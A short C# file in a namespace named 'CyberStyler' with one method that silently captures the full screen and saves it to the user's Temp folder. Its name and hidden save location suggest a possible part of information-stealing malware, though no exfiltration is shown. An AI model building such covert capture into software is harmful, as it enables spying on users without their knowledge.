using System;
using System.Drawing;
using System.Windows.Forms;

namespace CyberStyler
{
    class Screenshot
    {
        static public void GetScreenshot()
        {
            string User = Environment.UserName;
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                bmp.Save(@"C:\Users\" + User + @"\AppData\Local\Temp\screenshot.png");
            }
        }
    }
}
